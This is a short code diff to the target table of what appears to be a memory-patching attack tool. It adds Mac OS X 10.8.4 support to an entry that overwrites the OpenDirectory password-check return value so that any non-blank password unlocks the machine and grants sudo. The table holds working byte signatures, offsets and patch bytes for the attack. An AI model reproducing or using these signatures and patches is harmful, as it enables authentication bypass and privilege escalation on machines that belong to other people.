@@ -214,7 +214,7 @@ targets = [{'OS': 'Windows 8',
                                         'patch': 0x83f8109090b0018b,
                                         'patchoffset': 0x00}]}]},
            {'OS': 'Mac OS X',
-            'versions': ['10.6.4', '10.6.8', '10.7.3', '10.8.2'], #TODO: 10.8.4
+            'versions': ['10.6.4', '10.6.8', '10.7.3', '10.8.2', '10.8.4'],
             'architectures': ['x86', 'x64'],
             'name': 'DirectoryService/OpenDirectory unlock/privilege escalation',
             'notes': 'Overwrites DoShadowHashAuth/ODRecordVerifyPassword return value. After running, all local authentications (e.g., GUI, sudo, etc.) will work with all non-blank passwords',
@@ -240,7 +240,7 @@ targets = [{'OS': 'Windows 8',
                                         'patchoffset': 0x00},
                                        {'chunk': 0x89d8eb0231c04883c4785b415c415d415e415f5dc3,
                                         'internaloffset': 0x0e}]},
-                           {'offsets': [0x334], # 10.8.2 x64
+                           {'offsets': [0x334], # 10.8.2 x64, 10.8.3, 10.8.4
                             'chunks': [{'chunk': 0x88d84883c4685b415c415d415e415f5d,
                                         'internaloffset': 0x00,
                                         'patch': 0xb001, # mov al,1;
